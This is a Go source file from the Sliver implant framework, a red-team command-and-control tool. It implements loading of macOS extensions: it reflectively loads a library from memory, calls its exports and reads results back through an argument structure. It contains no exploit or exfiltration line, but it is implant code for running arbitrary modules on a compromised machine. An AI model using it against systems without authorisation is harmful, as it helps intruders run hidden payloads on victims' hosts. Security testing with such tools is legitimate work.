package extension

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"runtime"
	"sync"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/Binject/universal"
)

type DarwinExtension struct {
	id          string
	data        []byte
	module      *universal.Library
	arch        string
	serverStore bool
	init        string
	sync.Mutex
}

type extensionArguments struct {
	inDataSize  uintptr
	inDataBuff  uintptr
	outDataSize uintptr
	outDataBuff uintptr
}

func NewDarwinExtension(data []byte, id string, arch string, init string) *DarwinExtension {
	return &DarwinExtension{
		id:   id,
		data: data,
		arch: arch,
		init: init,
	}
}

func (d *DarwinExtension) GetID() string {
	return d.id
}

func (d *DarwinExtension) GetArch() string {
	return d.arch
}

func (d *DarwinExtension) Load() error {
	var err error
	d.Lock()
	defer d.Unlock()
	loader, err := universal.NewLoader()
	if err != nil {
		return err
	}
	d.module, err = loader.LoadLibrary(d.id, &d.data)
	if err != nil {
		return err
	}
	if d.init != "" {
		if _, errInit := d.module.Call(d.init); errInit != nil {
			return errInit
		}
	}
	return nil
}

func (d *DarwinExtension) Call(export string, arguments []byte, onFinish func([]byte)) error {
	// We currently have 2 issues with Darwin extensions:
	// - cppgo (used by universal) fucks up when calling a function with more than 1 argument
	// - we don't have Go callback support for the loaded extension,
	// so we have to wait for the call to finish to get the results
	// To circumvent these issues, we pass the extensionArguments structure
	// as the only argument to the call, so we can pass args in and extract
	// the result at the same time.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	extArgs := extensionArguments{}
	if len(arguments) > 0 {
		extArgs.inDataBuff = uintptr(unsafe.Pointer(&arguments[0]))
		extArgs.inDataSize = uintptr(uint64(len(arguments)))
	}
	// {{if .Config.Debug}}
	log.Printf("Calling %s, arg size: %d\n", export, extArgs.inDataSize)
	// {{end}}
	d.Lock()
	defer d.Unlock()
	_, err := d.module.Call(export, uintptr(unsafe.Pointer(&extArgs)))
	if err != nil {
		return err
	}
	// {{if .Config.Debug}}
	log.Printf("%s done!\n", export)
	// {{end}}
	outData := new(bytes.Buffer)
	outDataSize := int(extArgs.outDataSize)
	// {{if .Config.Debug}}
	log.Printf("Out data size: %d\n", outDataSize)
	// {{end}}
	for i := 0; i < outDataSize; i++ {
		b := (*byte)(unsafe.Pointer(uintptr(i) + extArgs.outDataBuff))
		outData.WriteByte(*b)
	}
	// We currently don't have a way to trigger a callback
	// in the loaded code for Darwin.
	if outData.Len() > 0 {
		onFinish(outData.Bytes())
	}
	return nil
}
